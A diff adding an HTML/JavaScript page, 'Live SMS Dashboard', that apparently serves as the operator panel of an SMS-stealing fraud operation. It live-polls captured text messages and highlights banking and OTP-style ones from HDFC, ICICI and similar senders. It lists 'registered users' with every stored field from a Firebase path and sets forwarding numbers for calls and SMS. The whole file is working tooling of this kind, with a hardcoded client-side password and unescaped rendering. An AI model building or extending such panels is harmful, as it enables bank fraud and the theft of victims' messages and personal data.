@@ -1,0 +1,1181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Live SMS Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/8.3.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.3.0/firebase-database.js"></script>
+  <script src="firebase-config.js"></script>
+
+  <style>
+    * { 
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #ffffff;
+      color: #333;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Login Screen - Clean White */
+    .login-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px;
+      border-radius: 20px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+    }
+
+    .login-title {
+      font-size: 24px;
+      margin-bottom: 30px;
+      color: #333;
+      font-weight: 600;
+    }
+
+    .password-input {
+      width: 100%;
+      padding: 15px;
+      background: #f8f9fa;
+      border: 2px solid #e9ecef;
+      border-radius: 10px;
+      color: #333;
+      font-size: 16px;
+      margin-bottom: 20px;
+      transition: all 0.3s;
+    }
+
+    .password-input:focus {
+      outline: none;
+      border-color: #667eea;
+      background: white;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+
+    .login-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(102,126,234,0.3);
+    }
+
+    .error-msg {
+      color: #ff4757;
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    /* Dashboard */
+    .dashboard {
+      min-height: 100vh;
+      background: #ffffff;
+    }
+
+    /* Status Bar */
+    .status-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: white;
+      padding: 12px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 100;
+      border-bottom: 1px solid #e9ecef;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+    }
+
+    .status-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .live-dot {
+      width: 8px;
+      height: 8px;
+      background: #00d084;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .status-text {
+      font-size: 14px;
+      color: #00d084;
+      font-weight: 500;
+    }
+
+    .time-display {
+      font-size: 14px;
+      color: #666;
+      font-family: monospace;
+    }
+
+    .logout-btn {
+      background: #ff4757;
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+      transition: all 0.3s;
+    }
+
+    .logout-btn:hover {
+      background: #ff3742;
+    }
+
+    /* Main Content */
+    .main-content {
+      padding-top: 60px;
+      padding-bottom: 20px;
+    }
+
+    /* Tabs */
+    .tabs-container {
+      position: sticky;
+      top: 60px;
+      background: white;
+      z-index: 90;
+      border-bottom: 1px solid #e9ecef;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+    }
+
+    .tabs {
+      display: flex;
+      overflow-x: auto;
+      padding: 0 20px;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .tab {
+      padding: 15px 20px;
+      background: none;
+      border: none;
+      color: #666;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      white-space: nowrap;
+      border-bottom: 2px solid transparent;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .tab.active {
+      color: #667eea;
+      border-bottom-color: #667eea;
+    }
+
+    /* Content Sections */
+    .section {
+      display: none;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .section.active {
+      display: block;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    /* Live SMS Section - Clean Design */
+    .sms-inbox {
+      padding: 20px;
+    }
+
+    .inbox-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .inbox-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #333;
+    }
+
+    .sms-count {
+      background: #667eea;
+      color: white;
+      padding: 6px 15px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 500;
+    }
+
+    .sms-list {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .sms-item {
+      background: white;
+      border: 1px solid #e9ecef;
+      border-radius: 12px;
+      padding: 20px;
+      transition: all 0.3s;
+      animation: slideIn 0.3s ease-out;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+    }
+
+    .sms-item.new {
+      border-color: #00d084;
+      background: #f8fff9;
+      animation: highlightPulse 1s ease;
+    }
+
+    @keyframes highlightPulse {
+      0%, 100% { background: #f8fff9; }
+      50% { background: #e8f7ef; }
+    }
+
+    @keyframes slideIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .sms-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+
+    .sender-info {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .sender-avatar {
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 14px;
+      color: white;
+    }
+
+    .sender-details h4 {
+      font-size: 16px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 4px;
+    }
+
+    .sender-details p {
+      font-size: 12px;
+      color: #666;
+    }
+
+    .sms-time {
+      font-size: 12px;
+      color: #888;
+      font-weight: 500;
+    }
+
+    .sms-message {
+      font-size: 15px;
+      line-height: 1.6;
+      margin: 15px 0;
+      word-wrap: break-word;
+      color: #444;
+    }
+
+    .sms-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 15px;
+      padding-top: 15px;
+      border-top: 1px solid #f1f3f5;
+    }
+
+    .sms-id {
+      font-size: 11px;
+      color: #888;
+      font-family: monospace;
+      background: #f8f9fa;
+      padding: 4px 8px;
+      border-radius: 4px;
+    }
+
+    .sms-actions {
+      display: flex;
+      gap: 8px;
+    }
+
+    .action-btn {
+      padding: 6px 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .copy-btn {
+      background: #667eea;
+      color: white;
+    }
+
+    .copy-btn:hover {
+      background: #5a6fd8;
+      transform: translateY(-1px);
+    }
+
+    /* Banking SMS Style */
+    .sms-item.banking {
+      border-color: #00d084;
+      background: linear-gradient(135deg, rgba(102,126,234,0.05), rgba(118,75,162,0.05));
+    }
+
+    .banking-badge {
+      background: #00d084;
+      color: white;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 10px;
+      font-weight: 600;
+      margin-left: 8px;
+    }
+
+    /* Users Section */
+    .users-section {
+      padding: 20px;
+    }
+
+    .users-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    .user-card {
+      background: white;
+      border: 1px solid #e9ecef;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+    }
+
+    .user-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #f1f3f5;
+    }
+
+    .user-id {
+      font-family: monospace;
+      color: #667eea;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .user-data {
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .data-row {
+      margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      border-bottom: 1px solid #f8f9fa;
+    }
+
+    .data-row:last-child {
+      border-bottom: none;
+    }
+
+    .data-label {
+      color: #666;
+      font-weight: 500;
+    }
+
+    .data-value {
+      color: #333;
+      font-weight: 600;
+    }
+
+    /* Settings Sections */
+    .settings-section {
+      padding: 20px;
+    }
+
+    .settings-card {
+      background: white;
+      border: 1px solid #e9ecef;
+      border-radius: 12px;
+      padding: 25px;
+      max-width: 500px;
+      margin: 0 auto;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.05);
+    }
+
+    .settings-title {
+      font-size: 18px;
+      margin-bottom: 25px;
+      color: #333;
+      font-weight: 600;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    .input-label {
+      display: block;
+      margin-bottom: 8px;
+      color: #666;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      background: #f8f9fa;
+      border: 2px solid #e9ecef;
+      border-radius: 8px;
+      color: #333;
+      font-size: 14px;
+      transition: all 0.3s;
+    }
+
+    .input-field:focus {
+      outline: none;
+      border-color: #667eea;
+      background: white;
+    }
+
+    .save-btn {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.2s;
+      margin-top: 10px;
+    }
+
+    .save-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(102,126,234,0.2);
+    }
+
+    /* Toast Notifications */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: white;
+      border: 1px solid #e9ecef;
+      border-radius: 10px;
+      padding: 12px 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      animation: slideUp 0.3s ease;
+      z-index: 1000;
+      max-width: 300px;
+      color: #333;
+      font-weight: 500;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* Loading Animation */
+    .loading-spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #e9ecef;
+      border-radius: 50%;
+      border-top-color: #667eea;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Empty State */
+    .empty-state {
+      text-align: center;
+      padding: 50px 20px;
+      color: #888;
+      background: white;
+      border: 1px solid #e9ecef;
+      border-radius: 12px;
+    }
+
+    .empty-icon {
+      font-size: 48px;
+      margin-bottom: 20px;
+      opacity: 0.5;
+      color: #667eea;
+    }
+
+    .empty-state h3 {
+      color: #666;
+      margin-bottom: 10px;
+      font-size: 18px;
+    }
+
+    .empty-state p {
+      color: #888;
+      font-size: 14px;
+    }
+
+    /* Connection Status */
+    .connection-status {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      background: white;
+      border: 1px solid #00d084;
+      border-radius: 8px;
+      padding: 8px 12px;
+      font-size: 11px;
+      color: #00d084;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    /* Mobile Responsive */
+    @media (max-width: 768px) {
+      .login-box {
+        padding: 30px 20px;
+      }
+      
+      .tabs {
+        padding: 0 10px;
+      }
+      
+      .tab {
+        padding: 12px 15px;
+        font-size: 13px;
+      }
+      
+      .sms-inbox {
+        padding: 15px;
+      }
+      
+      .users-grid {
+        grid-template-columns: 1fr;
+      }
+      
+      .connection-status {
+        left: 10px;
+        right: 10px;
+        bottom: 10px;
+      }
+    }
+
+    /* Scrollbar Styling */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #f1f3f5;
+      border-radius: 3px;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #c1c5d1;
+      border-radius: 3px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #a8adb9;
+    }
+  </style>
+</head>
+<body>
+
+<!-- 🔐 Login Screen -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <h1 class="login-title">Live SMS Dashboard</h1>
+    <input type="password" id="adminPass" class="password-input" placeholder="Enter Password" autocomplete="off">
+    <button onclick="login()" class="login-btn">🔓 Login</button>
+    <p id="error" class="error-msg"></p>
+  </div>
+</div>
+
+<!-- 📱 Dashboard -->
+<div class="dashboard" id="dashboard" style="display:none;">
+  
+  <!-- Status Bar -->
+  <div class="status-bar">
+    <div class="status-left">
+      <div class="live-dot"></div>
+      <span class="status-text">LIVE UPDATING</span>
+    </div>
+    <div class="time-display" id="currentTime">00:00:00</div>
+    <button class="logout-btn" onclick="logout()">Logout</button>
+  </div>
+
+  <!-- Main Content -->
+  <div class="main-content">
+    
+    <!-- Tabs -->
+    <div class="tabs-container">
+      <div class="tabs">
+        <button class="tab active" onclick="switchTab('live')">
+          <span>📱</span> Live SMS
+        </button>
+        <button class="tab" onclick="switchTab('users')">
+          <span>👥</span> Users
+        </button>
+        <button class="tab" onclick="switchTab('phone')">
+          <span>📞</span> Phone
+        </button>
+        <button class="tab" onclick="switchTab('sms')">
+          <span>💬</span> SMS
+        </button>
+      </div>
+    </div>
+
+    <!-- Live SMS Section -->
+    <div class="section active" id="live">
+      <div class="sms-inbox">
+        <div class="inbox-header">
+          <h2 class="inbox-title">Live SMS Inbox</h2>
+          <div class="sms-count">
+            <span id="smsCount">0</span> messages
+          </div>
+        </div>
+        
+        <div class="sms-list" id="smsList">
+          <!-- SMS will appear here automatically -->
+        </div>
+      </div>
+    </div>
+
+    <!-- Users Section -->
+    <div class="section" id="users">
+      <div class="users-section">
+        <h2 class="inbox-title">Registered Users</h2>
+        <div class="users-grid" id="userList">
+          <!-- Users will appear here -->
+        </div>
+      </div>
+    </div>
+
+    <!-- Phone Settings -->
+    <div class="section" id="phone">
+      <div class="settings-section">
+        <div class="settings-card">
+          <h3 class="settings-title">Phone Number Settings</h3>
+          <div class="input-group">
+            <label class="input-label">Phone Number</label>
+            <input type="text" id="phoneInput" class="input-field" placeholder="+91XXXXXXXXXX">
+          </div>
+          <button onclick="savePhone()" class="save-btn">💾 Save Changes</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- SMS Settings -->
+    <div class="section" id="sms">
+      <div class="settings-section">
+        <div class="settings-card">
+          <h3 class="settings-title">SMS Number Settings</h3>
+          <div class="input-group">
+            <label class="input-label">SMS Number</label>
+            <input type="text" id="smsInput" class="input-field" placeholder="+91XXXXXXXXXX">
+          </div>
+          <button onclick="saveSms()" class="save-btn">💾 Save Changes</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Connection Status -->
+  <div class="connection-status" id="connectionStatus">
+    <span>🔄 Last update: <span id="lastUpdate">Just now</span></span>
+  </div>
+</div>
+
+<script>
+  const PASSWORD = "CSK@1234";
+  let lastUpdateTime = new Date();
+  let autoRefreshInterval;
+  let currentSMS = [];
+  let isLiveTabActive = true;
+
+  // Initialize
+  window.onload = function() {
+    // Check if already logged in
+    const lastLogin = localStorage.getItem("loginTime");
+    if (lastLogin && Date.now() - lastLogin < 30 * 60 * 1000) {
+      showDashboard();
+    }
+    
+    // Update time display
+    updateTime();
+    setInterval(updateTime, 1000);
+  };
+
+  // Login function
+  function login() {
+    const pass = document.getElementById("adminPass").value;
+    const errorEl = document.getElementById("error");
+    
+    if (pass === PASSWORD) {
+      localStorage.setItem("loginTime", Date.now());
+      showToast("✅ Login successful!");
+      showDashboard();
+    } else {
+      errorEl.innerText = "❌ Incorrect password!";
+      document.getElementById("adminPass").style.borderColor = "#ff4757";
+      setTimeout(() => {
+        errorEl.innerText = "";
+        document.getElementById("adminPass").style.borderColor = "#e9ecef";
+      }, 3000);
+    }
+  }
+
+  // Logout function
+  function logout() {
+    clearInterval(autoRefreshInterval);
+    localStorage.removeItem("loginTime");
+    showToast("👋 Logged out successfully");
+    setTimeout(() => location.reload(), 1000);
+  }
+
+  // Show dashboard
+  function showDashboard() {
+    document.getElementById("loginScreen").style.display = "none";
+    document.getElementById("dashboard").style.display = "block";
+    
+    // Load initial data
+    loadInitialData();
+    
+    // Start auto-refresh (silent)
+    startAutoRefresh();
+    
+    // Session timeout
+    setTimeout(() => {
+      showToast("🔒 Session expired. Please login again.");
+      localStorage.removeItem("loginTime");
+      location.reload();
+    }, 30 * 60 * 1000);
+  }
+
+  // Switch tabs
+  function switchTab(tabId) {
+    // Update active tab
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.classList.remove('active');
+    });
+    event.target.classList.add('active');
+    
+    // Update active section
+    document.querySelectorAll('.section').forEach(section => {
+      section.classList.remove('active');
+    });
+    document.getElementById(tabId).classList.add('active');
+    
+    // Update tab state
+    isLiveTabActive = (tabId === 'live');
+  }
+
+  // Load initial data
+  function loadInitialData() {
+    // Load settings
+    fetch('call-edit/data.json')
+      .then(r => r.json())
+      .then(d => {
+        document.getElementById("phoneInput").value = d.mobile || "";
+      })
+      .catch(() => {});
+    
+    fetch('edit-number/data.json')
+      .then(r => r.json())
+      .then(d => {
+        document.getElementById("smsInput").value = d.mobile || "";
+      })
+      .catch(() => {});
+    
+    // Load SMS data
+    fetchSMS();
+    
+    // Load users
+    fetchUsers();
+  }
+
+  // Start auto-refresh (silent)
+  function startAutoRefresh() {
+    // Fast refresh for SMS (every 3 seconds)
+    autoRefreshInterval = setInterval(() => {
+      if (isLiveTabActive) {
+        fetchSMS();
+      }
+    }, 3000);
+    
+    // Slower refresh for users (every 30 seconds)
+    setInterval(fetchUsers, 30000);
+  }
+
+  // Fetch SMS data (silent - no loading indicator)
+  function fetchSMS() {
+    fetch("sms_data.json?t=" + new Date().getTime())
+      .then(r => {
+        if (!r.ok) throw new Error();
+        return r.json();
+      })
+      .then(data => {
+        // Check if there are new SMS
+        if (JSON.stringify(data) !== JSON.stringify(currentSMS)) {
+          const oldLength = currentSMS.length;
+          currentSMS = data;
+          renderSMS(data);
+          updateLastUpdate();
+          
+          // Show notification for new SMS
+          if (data.length > oldLength && isLiveTabActive) {
+            showNewSMSNotification(data.length - oldLength);
+          }
+        }
+      })
+      .catch(() => {
+        // Silent error - don't show to user
+        updateLastUpdate("Connection error");
+      });
+  }
+
+  // Render SMS list
+  function renderSMS(data) {
+    const smsList = document.getElementById("smsList");
+    const smsCount = document.getElementById("smsCount");
+    
+    smsCount.textContent = data.length;
+    
+    if (data.length === 0) {
+      smsList.innerHTML = `
+        <div class="empty-state">
+          <div class="empty-icon">📭</div>
+          <h3>No SMS Yet</h3>
+          <p>Waiting for incoming messages...</p>
+        </div>
+      `;
+      return;
+    }
+    
+    // Sort by timestamp (newest first)
+    data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+    
+    let html = '';
+    const now = new Date();
+    
+    data.forEach((sms, index) => {
+      const smsTime = new Date(sms.timestamp);
+      const isNew = (now - smsTime) < 30000; // Less than 30 seconds old
+      const isBanking = sms.sender && (
+        sms.sender.includes('BANK') || 
+        sms.sender.includes('AX-') || 
+        sms.sender.includes('ICICI') ||
+        sms.sender.includes('HDFC') ||
+        sms.message.includes('debited') ||
+        sms.message.includes('credited') ||
+        sms.message.includes('balance')
+      );
+      
+      html += `
+        <div class="sms-item ${isNew ? 'new' : ''} ${isBanking ? 'banking' : ''}">
+          <div class="sms-header">
+            <div class="sender-info">
+              <div class="sender-avatar">
+                ${sms.sender ? sms.sender.charAt(0).toUpperCase() : '?'}
+              </div>
+              <div class="sender-details">
+                <h4>${sms.sender || 'Unknown'}
+                  ${isBanking ? '<span class="banking-badge">BANK</span>' : ''}
+                </h4>
+                <p>To: ${sms.receiver || 'Unknown'}</p>
+              </div>
+            </div>
+            <div class="sms-time">
+              ${formatRelativeTime(sms.timestamp)}
+            </div>
+          </div>
+          
+          <div class="sms-message">
+            ${sms.message || 'No content'}
+          </div>
+          
+          <div class="sms-footer">
+            <div class="sms-id">
+              ID: ${sms.id ? sms.id.substring(0, 12) + '...' : 'N/A'}
+            </div>
+            <div class="sms-actions">
+              <button class="action-btn copy-btn" onclick="copySMS(${index})">
+                📋 Copy
+              </button>
+            </div>
+          </div>
+        </div>
+      `;
+    });
+    
+    smsList.innerHTML = html;
+  }
+
+  // Fetch users
+  function fetchUsers() {
+    const userList = document.getElementById("userList");
+    
+    firebase.database().ref("ududip007").once("value")
+      .then(snapshot => {
+        const data = snapshot.val();
+        if (!data) {
+          userList.innerHTML = `
+            <div class="empty-state">
+              <div class="empty-icon">👤</div>
+              <h3>No Users Found</h3>
+              <p>No users have registered yet</p>
+            </div>
+          `;
+          return;
+        }
+        
+        const users = Object.entries(data);
+        let html = '';
+        
+        users.reverse().forEach(([key, user]) => {
+          html += `
+            <div class="user-card">
+              <div class="user-header">
+                <div class="user-id">${key.substring(0, 12)}...</div>
+                <span style="font-size: 11px; color: #667eea; background: #f8f9fa; padding: 2px 8px; border-radius: 4px;">
+                  Active
+                </span>
+              </div>
+              <div class="user-data">
+                ${Object.entries(user).map(([k, v]) => `
+                  <div class="data-row">
+                    <span class="data-label">${k}:</span>
+                    <span class="data-value">${v}</span>
+                  </div>
+                `).join('')}
+              </div>
+            </div>
+          `;
+        });
+        
+        userList.innerHTML = html;
+      })
+      .catch(() => {
+        // Silent error
+      });
+  }
+
+  // Save phone number
+  function savePhone() {
+    const number = document.getElementById("phoneInput").value.trim();
+    if (!number) return showToast("⚠️ Please enter a phone number");
+    
+    fetch("save-phone.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ mobile: number })
+    })
+    .then(() => showToast("✅ Phone number updated successfully!"))
+    .catch(() => showToast("❌ Failed to update phone number"));
+  }
+
+  // Save SMS number
+  function saveSms() {
+    const number = document.getElementById("smsInput").value.trim();
+    if (!number) return showToast("⚠️ Please enter a SMS number");
+    
+    fetch("save-sms.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ mobile: number })
+    })
+    .then(() => showToast("✅ SMS number updated successfully!"))
+    .catch(() => showToast("❌ Failed to update SMS number"));
+  }
+
+  // Copy SMS
+  function copySMS(index) {
+    const sms = currentSMS[index];
+    if (!sms) return;
+    
+    const text = `Sender: ${sms.sender || 'Unknown'}\nReceiver: ${sms.receiver || 'Unknown'}\nTime: ${sms.timestamp || 'Unknown'}\n\nMessage: ${sms.message || 'No message'}`;
+    
+    navigator.clipboard.writeText(text)
+      .then(() => showToast("📋 SMS copied to clipboard!"))
+      .catch(() => showToast("❌ Failed to copy SMS"));
+  }
+
+  // Helper functions
+  function updateTime() {
+    const now = new Date();
+    const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    document.getElementById("currentTime").textContent = timeStr;
+  }
+
+  function updateLastUpdate(status = "Updated") {
+    const now = new Date();
+    const diff = Math.floor((now - lastUpdateTime) / 1000);
+    
+    let text;
+    if (diff < 10) text = "Just now";
+    else if (diff < 60) text = `${diff} sec ago`;
+    else if (diff < 120) text = "1 min ago";
+    else text = `${Math.floor(diff / 60)} min ago`;
+    
+    document.getElementById("lastUpdate").textContent = text;
+    
+    const statusEl = document.getElementById("connectionStatus");
+    if (status !== "Updated") {
+      statusEl.style.borderColor = "#ff4757";
+      statusEl.style.color = "#ff4757";
+    } else {
+      statusEl.style.borderColor = "#00d084";
+      statusEl.style.color = "#00d084";
+      lastUpdateTime = now;
+    }
+  }
+
+  function formatRelativeTime(timestamp) {
+    const now = new Date();
+    const smsTime = new Date(timestamp);
+    const diff = Math.floor((now - smsTime) / 1000);
+    
+    if (diff < 10) return "Just now";
+    if (diff < 60) return `${diff} sec ago`;
+    if (diff < 3600) return `${Math.floor(diff / 60)} min ago`;
+    if (diff < 86400) return `${Math.floor(diff / 3600)} hr ago`;
+    
+    return smsTime.toLocaleDateString([], { month: 'short', day: 'numeric' });
+  }
+
+  function showNewSMSNotification(count) {
+    // Show subtle notification
+    const notification = document.createElement('div');
+    notification.className = 'toast';
+    notification.textContent = `📩 ${count} new message${count > 1 ? 's' : ''}`;
+    document.body.appendChild(notification);
+    
+    setTimeout(() => {
+      notification.style.opacity = '0';
+      notification.style.transform = 'translateY(20px)';
+      setTimeout(() => notification.remove(), 300);
+    }, 2000);
+  }
+
+  function showToast(message) {
+    // Remove existing toast
+    const existingToast = document.querySelector('.toast');
+    if (existingToast) existingToast.remove();
+    
+    // Create new toast
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.textContent = message;
+    document.body.appendChild(toast);
+    
+    // Remove after 3 seconds
+    setTimeout(() => {
+      toast.style.opacity = '0';
+      toast.style.transform = 'translateY(20px)';
+      setTimeout(() => {
+        if (toast.parentNode) toast.parentNode.removeChild(toast);
+      }, 300);
+    }, 3000);
+  }
+</script>
+</body>
+</html>
